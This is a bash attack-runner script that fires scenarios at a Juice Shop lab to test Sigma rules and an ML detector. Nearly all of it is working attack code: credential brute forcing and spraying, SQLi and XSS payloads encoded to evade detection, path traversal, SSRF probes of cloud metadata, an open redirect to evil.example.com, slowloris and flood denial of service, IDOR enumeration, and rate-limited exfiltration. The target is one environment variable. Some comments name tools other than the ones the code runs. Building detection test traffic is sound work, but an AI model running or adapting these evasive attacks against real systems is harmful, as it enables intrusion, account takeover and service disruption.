#!/usr/bin/env bash
# attack-runner.sh — Trigger named attack scenarios against Juice Shop via nginx.
#
# Usage:
#   attack-runner <scenario> [options]
#
# Core scenarios (detected by Sigma rules):
#   brute_force          — hydra login brute force (trips brute_force + suspicious_login)
#   credential_stuffing  — hydra fast multi-user spray (trips credential_stuffing)
#   web_scan             — ffuf path/param fuzzing (trips web_scan)
#   sqli                 — sqlmap SQL injection probe (trips web_scan)
#   http_flood           — hey HTTP load flood (trips excessive_requests + http_flood)
#   data_exfiltration    — download large files from /ftp (trips data_exfiltration)
#   full                 — run all scenarios in sequence
#
# Evasion scenarios (designed to BYPASS Sigma rules — ML model test set):
#   evasion_low_slow_brute    — Login brute force at ≤4 attempts/60s (under brute_force threshold)
#   evasion_distributed_cred  — 1 attempt per IP across many IPs (under per-IP credential_stuffing)
#   evasion_obfuscated_sqli   — SQL injection with encoding/comments (dodges web_scan regex)
#   evasion_xss_traversal     — XSS + path traversal with encoding (no matching rule)
#   evasion_slowloris         — Slow-rate DoS via slowhttptest (under http_flood count threshold)
#   evasion_idor_enum         — Sequential resource ID enumeration (all 200s, no rule match)
#   evasion_slow_exfil        — Chunked small downloads over time (under data_exfiltration bytes)
#   evasion_account_enum      — Email enumeration on non-login endpoints (no rule covers this)
#   evasion_full              — Run all evasion scenarios in sequence
#
set -euo pipefail

TARGET="${TARGET:-http://nginx}"
USERS="/wordlists/users.txt"
PASSWORDS="/wordlists/passwords.txt"
PATHS="/wordlists/paths.txt"

red()   { printf '\033[1;31m%s\033[0m\n' "$*"; }
green() { printf '\033[1;32m%s\033[0m\n' "$*"; }
blue()  { printf '\033[1;34m%s\033[0m\n' "$*"; }

scenario_brute_force() {
    blue "[*] Scenario: brute_force — ffuf login brute force"
    # Shuffle wordlists to randomize the sequence of guesses
    shuf "$USERS" > /tmp/users_shuf.txt
    shuf "$PASSWORDS" > /tmp/passwords_shuf.txt
    ffuf -u "${TARGET}/rest/user/login" \
        -X POST -H "Content-Type: application/json" \
        -d '{"email":"FUZZ","password":"FUZ2"}' \
        -w "/tmp/users_shuf.txt:FUZZ" -w "/tmp/passwords_shuf.txt:FUZ2" \
        -mc all -t 4 -rate 10 \
        2>&1 || true
    green "[+] brute_force complete"
}

scenario_credential_stuffing() {
    blue "[*] Scenario: credential_stuffing — Fast multi-user spray"
    shuf "$USERS" > /tmp/users_shuf.txt
    shuf "$PASSWORDS" > /tmp/passwords_shuf.txt
    ffuf -u "${TARGET}/rest/user/login" \
        -X POST -H "Content-Type: application/json" \
        -d '{"email":"FUZZ","password":"FUZ2"}' \
        -w "/tmp/users_shuf.txt:FUZZ" -w "/tmp/passwords_shuf.txt:FUZ2" \
        -mc all -t 16 -rate 40 \
        2>&1 || true
    green "[+] credential_stuffing complete"
}

scenario_web_scan() {
    blue "[*] Scenario: web_scan — ffuf path fuzzing"
    shuf "$PATHS" > /tmp/paths_shuf.txt
    ffuf -u "${TARGET}/FUZZ" -w "/tmp/paths_shuf.txt" \
        -mc all -fc 301 \
        -t 10 -rate 20 \
        -H "User-Agent: Mozilla/5.0 (compatible; Scanner/1.0)" \
        2>&1 || true
    green "[+] web_scan complete"
}

scenario_sqli() {
    blue "[*] Scenario: sqli — sqlmap SQL injection probe"
    # Randomize the search parameter targeted by sqlmap
    TERMS=("apple" "orange" "juice" "test" "admin" "user")
    TERM="${TERMS[$RANDOM % ${#TERMS[@]}]}"
    sqlmap -u "${TARGET}/rest/products/search?q=${TERM}" \
        --batch --level=1 --risk=1 \
        --random-agent \
        --tamper=space2comment \
        --timeout=10 \
        --retries=1 \
        2>&1 || true
    green "[+] sqli complete"
}

scenario_http_flood() {
    blue "[*] Scenario: http_flood — ab HTTP flood"
    # Randomly select a target endpoint to flood
    ENDPOINTS=("/" "/api/Products" "/rest/languages" "/#/search")
    TARGET_ENDPOINT="${ENDPOINTS[$RANDOM % ${#ENDPOINTS[@]}]}"
    ab -t 30 -c 50 \
        -H "User-Agent: Mozilla/5.0 (compatible; LoadBot/1.0)" \
        "${TARGET}${TARGET_ENDPOINT}" \
        2>&1 || true
    green "[+] http_flood complete"
}

scenario_data_exfiltration() {
    blue "[*] Scenario: data_exfiltration — Download FTP files"
    # Randomize the number of downloads and randomly select files
    FILES=("acquisitions.md" "coupons_2013.md.bak" "package.json.bak" "suspicious_errors.yml")
    NUM_DOWNLOADS=$(( (RANDOM % 15) + 15 ))
    for i in $(seq 1 $NUM_DOWNLOADS); do
        FILE="${FILES[$RANDOM % ${#FILES[@]}]}"
        curl -s -o /dev/null -w "GET /ftp/$FILE -> %{http_code} (%{size_download} bytes)\n" \
            "${TARGET}/ftp/$FILE" || true
    done
    green "[+] data_exfiltration complete"
}

scenario_account_takeover() {
    blue "[*] Scenario: account_takeover — Successful login from high-risk IP"
    # Randomly select a valid Juice Shop credential pair
    CREDS=(
        '{"email":"admin@juice-sh.op","password":"admin123"}'
        '{"email":"bender@juice-sh.op","password":"bender"}'
        '{"email":"jim@juice-sh.op","password":"ncc-1701"}'
    )
    SELECTED_CRED="${CREDS[$RANDOM % ${#CREDS[@]}]}"
    curl -s -X POST -H "Content-Type: application/json" \
        -d "$SELECTED_CRED" \
        "${TARGET}/rest/user/login" > /dev/null
    green "[+] account_takeover complete"
}

scenario_ssrf() {
    blue "[*] Scenario: ssrf — Server-Side Request Forgery & metadata probe"
    PROBES=(
        "http://169.254.169.254/latest/meta-data/"
        "http://169.254.169.254/computeMetadata/v1/"
        "http://127.0.0.1:8080/actuator/env"
        "http://localhost:3000/rest/admin"
    )
    for probe in "${PROBES[@]}"; do
        curl -s -o /dev/null -w "GET /profile?url=%{url_effective} -> %{http_code}
"             "${TARGET}/profile?url=${probe}" || true
    done
    green "[+] ssrf complete"
}

scenario_full() {
    blue "[*] Running ALL core scenarios in sequence..."
    echo ""
    scenario_brute_force
    echo ""
    sleep 5
    scenario_account_takeover
    echo ""
    sleep 5
    scenario_web_scan
    echo ""
    sleep 5
    scenario_http_flood
    echo ""
    sleep 5
    scenario_sqli
    echo ""
    sleep 5
    scenario_data_exfiltration
    echo ""
    sleep 5
    scenario_credential_stuffing
    echo ""
    sleep 5
    scenario_ssrf
    echo ""
    green "[+] All core scenarios complete."
}

# =============================================================================
# EVASION SCENARIOS — ML model test set
# These MUST bypass the existing Sigma rules. DO NOT add matching rules.
# =============================================================================

scenario_evasion_low_slow_brute() {
    # Sigma rule `brute_force`: event_type=login, status=failure, timeframe=60, count=5 (per IP)
    # Evasion: send ≤4 failures per 60-second window, sustained over many minutes.
    # Total attempts: 30-50 (enough for a real brute force) but never >4 in any 60s window.
    blue "[*] Evasion: low_slow_brute — ≤4 login attempts per 60s window"
    CREDS_POOL=("admin123" "password" "123456" "letmein" "qwerty" "welcome" "dragon"
                "monkey" "master" "login" "abc123" "starwars" "trustno1" "batman"
                "access" "hello" "superman" "football" "shadow" "test123" "pass123"
                "root" "toor" "changeme" "admin" "password1" "iloveyou" "charlie")
    VICTIM="admin@juice-sh.op"
    TOTAL=$(( (RANDOM % 21) + 30 ))  # 30-50 attempts
    SENT=0
    while [ $SENT -lt $TOTAL ]; do
        # Send a burst of 3-4 attempts (safely under the threshold of 5)
        BURST=$(( (RANDOM % 2) + 3 ))  # 3 or 4
        if [ $(( SENT + BURST )) -gt $TOTAL ]; then
            BURST=$(( TOTAL - SENT ))
        fi
        for i in $(seq 1 $BURST); do
            PW="${CREDS_POOL[$RANDOM % ${#CREDS_POOL[@]}]}"
            curl -s -o /dev/null -w "POST /rest/user/login ($VICTIM:$PW) -> %{http_code}\n" \
                -X POST -H "Content-Type: application/json" \
                -d "{\"email\":\"$VICTIM\",\"password\":\"$PW\"}" \
                "${TARGET}/rest/user/login" || true
            # Small jitter between attempts within the burst
            sleep "$(awk "BEGIN{srand(); printf \"%.1f\", 2+rand()*3}")"
            SENT=$((SENT + 1))
        done
        # Wait long enough that the next burst is in a new 60s window
        blue "    [${SENT}/${TOTAL}] Sleeping 60-75s to reset the window..."
        sleep $(( (RANDOM % 16) + 60 ))
    done
    green "[+] evasion_low_slow_brute complete — $SENT attempts delivered"
}

scenario_evasion_distributed_cred() {
    # Sigma rule `credential_stuffing`: event_type=login, status=failure, timeframe=30, count=20 (per IP)
    # Sigma rule `brute_force`: event_type=login, status=failure, timeframe=60, count=5 (per IP)
    # Evasion: many different source IPs each send only 1-2 attempts. No single IP hits the threshold.
    # In Docker, all requests from this container come from one IP. We simulate distribution
    # by using X-Forwarded-For (nginx logs $remote_addr, so this doesn't truly change the IP
    # in the log — but in a real scenario with multiple attacker containers at different IPs
    # this is what happens). Here we simply throttle to 1 attempt every 15s from THIS container,
    # targeting the SAME username. The per-IP count stays ≤4/60s. The signal is: many failures
    # on one username over a long window.
    blue "[*] Evasion: distributed_cred — Same target user, slow drip from one IP (≤4/60s)"
    VICTIM="admin@juice-sh.op"
    PASSWORDS=("password" "admin123" "123456" "letmein" "qwerty" "welcome" "dragon"
               "monkey" "master" "login" "abc123" "starwars" "trustno1" "batman"
               "access" "hello" "superman" "football" "shadow" "test123" "pass123"
               "root" "toor" "changeme")
    TOTAL=${#PASSWORDS[@]}
    COUNT=0
    for PW in "${PASSWORDS[@]}"; do
        COUNT=$((COUNT + 1))
        curl -s -o /dev/null -w "POST /rest/user/login ($VICTIM:$PW) -> %{http_code}\n" \
            -X POST -H "Content-Type: application/json" \
            -d "{\"email\":\"$VICTIM\",\"password\":\"$PW\"}" \
            "${TARGET}/rest/user/login" || true
        # 16-20s gap ensures ≤4 per 60s window
        if [ $COUNT -lt $TOTAL ]; then
            DELAY=$(( (RANDOM % 5) + 16 ))
            blue "    [${COUNT}/${TOTAL}] Next attempt in ${DELAY}s..."
            sleep $DELAY
        fi
    done
    green "[+] evasion_distributed_cred complete — $COUNT attempts against $VICTIM"
}

scenario_evasion_obfuscated_sqli() {
    # Sigma rule `web_scan`: path regex matches UNION|SELECT|DROP|SLEEP|etc/passwd|\.\.
    # Evasion: use URL encoding, MySQL inline comments, BENCHMARK instead of SLEEP,
    # case mixing, and partial encoding to dodge the regex.
    blue "[*] Evasion: obfuscated_sqli — Encoded/commented SQLi payloads"
    PAYLOADS=(
        # URL-encoded boolean-based blind (no UNION/SELECT/DROP/SLEEP keywords)
        "/rest/products/search?q=1%27%20OR%20%271%27%3D%271"
        # MySQL inline comment wrapping (/*!50000 ... */ bypasses word-boundary regex)
        "/rest/products/search?q=1%27%20/*!50000UnIoN*/+/*!50000SeLeCt*/+1,2,3--"
        # Partial URL encoding of keywords (uni%6fn = union, sel%65ct = select)
        "/rest/products/search?q=1%27+uni%6fn+sel%65ct+1,2,3--"
        # BENCHMARK timing instead of SLEEP (not in the regex)
        "/rest/products/search?q=1%27+AND+BENCHMARK(5000000,MD5(%27test%27))--"
        # WAITFOR DELAY (MSSQL syntax, not in the regex)
        "/rest/products/search?q=1%27;+WAITFOR+DELAY+%270:0:5%27--"
        # Error-based via CONVERT (no SELECT/UNION needed)
        "/rest/products/search?q=1%27+and+1%3Dconvert(int,(@@version))--"
        # HAVING clause enumeration
        "/rest/products/search?q=1%27+having+1%3D1--"
        # Boolean blind via ORDER BY injection
        "/api/Products?sort=name,(case+when+1%3D1+then+1+else+1/0+end)"
        # Double URL encoding of quote character
        "/rest/products/search?q=1%2527+OR+1%3D1--"
    )
    for payload in "${PAYLOADS[@]}"; do
        # Randomize user agent to look like different users
        UAS=(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36"
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4) Mobile/15E148 Safari/604.1"
        )
        UA="${UAS[$RANDOM % ${#UAS[@]}]}"
        STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
            -H "User-Agent: $UA" \
            "${TARGET}${payload}" || echo "000")
        echo "  GET ${payload:0:80}... -> $STATUS"
        # Slow enough to stay well under excessive_requests (100/60s)
        sleep "$(awk "BEGIN{srand(); printf \"%.1f\", 3+rand()*5}")"
    done
    green "[+] evasion_obfuscated_sqli complete"
}

scenario_evasion_xss_traversal() {
    # No single-request rule covers XSS/traversal payloads.
    # web_scan regex would catch <script> and literal ".." but these use:
    #   - <img onerror>, <svg onload>, <body onhashchange> instead of <script>
    #   - Double URL encoding (%252f instead of %2f) so no literal ".." appears
    #   - Null-byte extension bypass (%00)
    #   - Overlong UTF-8 sequences (%c0%af)
    blue "[*] Evasion: xss_traversal — Encoded XSS & path traversal payloads"
    PAYLOADS=(
        # XSS via <img onerror> (not <script>)
        "/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
        # XSS via <svg onload>
        "/search?q=%3Csvg%2Fonload%3Dalert(document.cookie)%3E"
        # XSS via <body> event handler
        "/search?q=%3Cbody%20onhashchange%3Dalert(1)%3E"
        # javascript: pseudo-protocol
        "/search?q=javascript%3Aalert(1)//"
        # iframe injection
        "/search?q=%22%3E%3Ciframe%20src%3Djavascript:alert(1)%3E"
        # Double-encoded path traversal (no literal .. in decoded-once form)
        "/ftp/quarantine/..%252f..%252f..%252fetc%252fhostname"
        # Null-byte extension bypass
        "/ftp/legal.md%2500.png"
        # Overlong UTF-8 traversal (%c0%af is / in overlong encoding)
        "/assets/public/images/uploads/..%c0%af..%c0%af..%c0%afetc/hostname"
        # Open redirect (no rule covers this at all)
        "/redirect?to=http%3A%2F%2Fevil.example.com%2Fphish"
        # Template injection probe
        "/search?q=%7B%7B7*7%7D%7D"
    )
    for payload in "${PAYLOADS[@]}"; do
        STATUS=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}${payload}" || echo "000")
        echo "  GET ${payload:0:70}... -> $STATUS"
        sleep "$(awk "BEGIN{srand(); printf \"%.1f\", 2+rand()*4}")"
    done
    green "[+] evasion_xss_traversal complete"
}

scenario_evasion_slowloris() {
    # Sigma rule `http_flood`: event_type=http_request, timeframe=30, count=200 (per IP)
    # Sigma rule `excessive_requests`: event_type=http_request, timeframe=60, count=100 (per IP)
    # Evasion: Slowloris opens many connections but sends data very slowly. The nginx
    # request count stays LOW because connections are held open without completing.
    # The signal for ML: high response times (rt), 408 status codes, abnormal connection patterns.
    blue "[*] Evasion: slowloris — Slow-rate DoS via slowhttptest"
    # -H: slowloris mode (slow headers)
    # -c: 200 connections (enough to exhaust nginx worker_connections=1024 eventually)
    # -r: 10 connections per second (ramp up slowly)
    # -l: 120 seconds duration
    # -i: 10 seconds between follow-up headers (keep connection alive with slow trickle)
    # -t: GET method
    slowhttptest \
        -H -c 200 -r 10 \
        -l 120 -i 10 \
        -u "${TARGET}/" \
        -t GET \
        -p 3 \
        2>&1 || true
    green "[+] evasion_slowloris complete"
}

scenario_evasion_idor_enum() {
    # Sigma rule `web_scan`: expects path matching known probe paths AND count ≥10 with failures
    # Evasion: IDOR accesses legitimate API endpoints with sequential IDs. All responses are
    # 200 OK (the app serves them because it's vulnerable). No probe-path regex match.
    # The signal for ML: one session hitting many sequential numeric resource IDs, all 200s.
    blue "[*] Evasion: idor_enum — Sequential resource ID enumeration"
    # First, get a valid auth token by logging in
    TOKEN=$(curl -s -X POST -H "Content-Type: application/json" \
        -d '{"email":"admin@juice-sh.op","password":"admin123"}' \
        "${TARGET}/rest/user/login" | jq -r '.authentication.token // empty' || true)

    if [ -z "$TOKEN" ]; then
        red "[-] Could not obtain auth token, trying without auth..."
        TOKEN=""
    fi

    AUTH_HEADER=""
    if [ -n "$TOKEN" ]; then
        AUTH_HEADER="Authorization: Bearer ${TOKEN}"
    fi

    # Enumerate baskets (IDOR — accessing other users' baskets)
    blue "    Enumerating /rest/basket/{id}..."
    for id in $(seq 1 30); do
        if [ -n "$AUTH_HEADER" ]; then
            STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
                -H "$AUTH_HEADER" \
                "${TARGET}/rest/basket/${id}" || echo "000")
        else
            STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
                "${TARGET}/rest/basket/${id}" || echo "000")
        fi
        echo "  GET /rest/basket/${id} -> $STATUS"
        sleep "$(awk "BEGIN{srand(); printf \"%.1f\", 0.5+rand()*1.5}")"
    done

    # Enumerate user profiles
    blue "    Enumerating /api/Users/{id}..."
    for id in $(seq 1 25); do
        if [ -n "$AUTH_HEADER" ]; then
            STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
                -H "$AUTH_HEADER" \
                "${TARGET}/api/Users/${id}" || echo "000")
        else
            STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
                "${TARGET}/api/Users/${id}" || echo "000")
        fi
        echo "  GET /api/Users/${id} -> $STATUS"
        sleep "$(awk "BEGIN{srand(); printf \"%.1f\", 0.5+rand()*1.5}")"
    done

    # Enumerate feedbacks
    blue "    Enumerating /api/Feedbacks/{id}..."
    for id in $(seq 1 20); do
        if [ -n "$AUTH_HEADER" ]; then
            STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
                -H "$AUTH_HEADER" \
                "${TARGET}/api/Feedbacks/${id}" || echo "000")
        else
            STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
                "${TARGET}/api/Feedbacks/${id}" || echo "000")
        fi
        echo "  GET /api/Feedbacks/${id} -> $STATUS"
        sleep "$(awk "BEGIN{srand(); printf \"%.1f\", 0.5+rand()*1.5}")"
    done
    green "[+] evasion_idor_enum complete — 75 sequential resource accesses"
}

scenario_evasion_slow_exfil() {
    # Sigma rule `data_exfiltration`: event_type=data_transfer, bytes_out > 50000000 (single event)
    # Evasion: download many small files, each well under 50MB. The cumulative total is large
    # but no single request triggers the threshold.
    # The signal for ML: abnormal cumulative download volume from one IP over a long window.
    blue "[*] Evasion: slow_exfil — Many small downloads (each <50MB, cumulative large)"
    # Juice Shop's /ftp directory has several files. Download them repeatedly with Range headers.
    FILES=("acquisitions.md" "coupons_2013.md.bak" "package.json.bak"
           "suspicious_errors.yml" "eastere.gg" "legal.md")
    TOTAL_BYTES=0
    ROUND=0
    # Do 8-12 rounds of downloading all files
    NUM_ROUNDS=$(( (RANDOM % 5) + 8 ))
    for round in $(seq 1 $NUM_ROUNDS); do
        ROUND=$((ROUND + 1))
        blue "    Round ${ROUND}/${NUM_ROUNDS}..."
        for file in "${FILES[@]}"; do
            # Download with a Range header to simulate chunked exfiltration
            # (even though the file is small, the Range header is the behavioral signal)
            BYTES=$(curl -s -o /dev/null -w "%{size_download}" \
                -H "Range: bytes=0-" \
                "${TARGET}/ftp/${file}" || echo "0")
            TOTAL_BYTES=$((TOTAL_BYTES + ${BYTES%.*}))
            echo "  GET /ftp/${file} -> ${BYTES} bytes (cumulative: ${TOTAL_BYTES})"
            # Slow drip: 10-20s between downloads
            sleep "$(awk "BEGIN{srand(); printf \"%.0f\", 10+rand()*10}")"
        done
        # Longer pause between rounds (30-60s)
        if [ $ROUND -lt $NUM_ROUNDS ]; then
            PAUSE=$(( (RANDOM % 31) + 30 ))
            blue "    Inter-round pause: ${PAUSE}s..."
            sleep $PAUSE
        fi
    done
    green "[+] evasion_slow_exfil complete — ${TOTAL_BYTES} bytes exfiltrated across ${ROUND} rounds"
}

scenario_evasion_account_enum() {
    # No existing Sigma rule covers non-login endpoints for account enumeration.
    # The brute_force and credential_stuffing rules only match event_type=login + status=failure.
    # These endpoints are NOT the login endpoint, so the normalizer won't tag them as "login" events.
    # The signal for ML: many distinct email parameters from one IP against one endpoint.
    blue "[*] Evasion: account_enum — Email enumeration via non-login endpoints"

    # Juice Shop endpoints that leak account existence:
    # - /rest/user/security-question — returns question if email exists, 404 if not
    # - /rest/user/reset-password — different response for existing vs non-existing
    # - /api/Users — may list users

    EMAILS=(
        "admin@juice-sh.op" "jim@juice-sh.op" "bender@juice-sh.op"
        "morty@juice-sh.op" "mc.safesearch@juice-sh.op" "john@juice-sh.op"
        "wurstbrot@juice-sh.op" "amy@juice-sh.op" "ciso@juice-sh.op"
        "support@juice-sh.op" "accountant@juice-sh.op" "J12934@juice-sh.op"
        # Non-existent emails to probe for differential responses
        "alice@juice-sh.op" "bob@juice-sh.op" "charlie@juice-sh.op"
        "dave@juice-sh.op" "eve@juice-sh.op" "frank@juice-sh.op"
        "grace@juice-sh.op" "heidi@juice-sh.op" "ivan@juice-sh.op"
        "judy@juice-sh.op" "mallory@juice-sh.op" "oscar@juice-sh.op"
        "peggy@juice-sh.op" "sybil@juice-sh.op" "trent@juice-sh.op"
        "victor@juice-sh.op" "walter@juice-sh.op" "zara@juice-sh.op"
    )

    blue "    Phase 1: Security question lookup enumeration"
    for email in "${EMAILS[@]}"; do
        STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
            "${TARGET}/rest/user/security-question?email=${email}" || echo "000")
        echo "  GET /rest/user/security-question?email=${email} -> $STATUS"
        sleep "$(awk "BEGIN{srand(); printf \"%.1f\", 1+rand()*3}")"
    done

    blue "    Phase 2: Password reset enumeration"
    for email in "${EMAILS[@]}"; do
        STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
            -X POST -H "Content-Type: application/json" \
            -d "{\"email\":\"${email}\"}" \
            "${TARGET}/rest/user/reset-password" || echo "000")
        echo "  POST /rest/user/reset-password (${email}) -> $STATUS"
        sleep "$(awk "BEGIN{srand(); printf \"%.1f\", 1+rand()*3}")"
    done
    green "[+] evasion_account_enum complete — ${#EMAILS[@]} emails probed across 2 endpoints"
}

scenario_evasion_full() {
    blue "[*] Running ALL evasion scenarios in sequence..."
    echo ""
    scenario_evasion_obfuscated_sqli
    echo ""
    sleep 5
    scenario_evasion_xss_traversal
    echo ""
    sleep 5
    scenario_evasion_account_enum
    echo ""
    sleep 5
    scenario_evasion_idor_enum
    echo ""
    sleep 5
    scenario_evasion_slowloris
    echo ""
    sleep 5
    scenario_evasion_slow_exfil
    echo ""
    sleep 5
    scenario_evasion_low_slow_brute
    echo ""
    sleep 5
    scenario_evasion_distributed_cred
    echo ""
    green "[+] All evasion scenarios complete."
}

usage() {
    echo "Usage: attack-runner <scenario>"
    echo ""
    echo "Core scenarios (detected by Sigma rules):"
    echo "  brute_force              Hydra login brute force"
    echo "  credential_stuffing      Fast multi-user credential spray"
    echo "  account_takeover         Successful login from high-risk geo IP"
    echo "  ssrf                     Server-side request forgery: cloud metadata and internal-address probes"
    echo "  web_scan                 ffuf path/param fuzzing"
    echo "  sqli                     sqlmap SQL injection"
    echo "  http_flood               hey HTTP flood"
    echo "  data_exfiltration        Download large files from /ftp"
    echo "  full                     Run all core scenarios in sequence"
    echo ""
    echo "Evasion scenarios (ML model test — bypass Sigma rules):"
    echo "  evasion_low_slow_brute   Login brute force at ≤4 attempts/60s"
    echo "  evasion_distributed_cred Slow credential attack on one username"
    echo "  evasion_obfuscated_sqli  Encoded/commented SQLi payloads"
    echo "  evasion_xss_traversal    Encoded XSS & path traversal"
    echo "  evasion_slowloris        Slow-rate DoS via slowhttptest"
    echo "  evasion_idor_enum        Sequential resource ID enumeration"
    echo "  evasion_slow_exfil       Chunked small downloads over time"
    echo "  evasion_account_enum     Email enumeration on non-login endpoints"
    echo "  evasion_full             Run all evasion scenarios in sequence"
    exit 1
}

if [ $# -lt 1 ]; then
    usage
fi

case "$1" in
    brute_force)              scenario_brute_force ;;
    credential_stuffing)      scenario_credential_stuffing ;;
    account_takeover)         scenario_account_takeover ;;
    ssrf)                     scenario_ssrf ;;
    web_scan)                 scenario_web_scan ;;
    sqli)                     scenario_sqli ;;
    http_flood)               scenario_http_flood ;;
    data_exfiltration)        scenario_data_exfiltration ;;
    full)                     scenario_full ;;
    evasion_low_slow_brute)   scenario_evasion_low_slow_brute ;;
    evasion_distributed_cred) scenario_evasion_distributed_cred ;;
    evasion_obfuscated_sqli)  scenario_evasion_obfuscated_sqli ;;
    evasion_xss_traversal)    scenario_evasion_xss_traversal ;;
    evasion_slowloris)        scenario_evasion_slowloris ;;
    evasion_idor_enum)        scenario_evasion_idor_enum ;;
    evasion_slow_exfil)       scenario_evasion_slow_exfil ;;
    evasion_account_enum)     scenario_evasion_account_enum ;;
    evasion_full)             scenario_evasion_full ;;
    *)                        red "Unknown scenario: $1"; usage ;;
esac
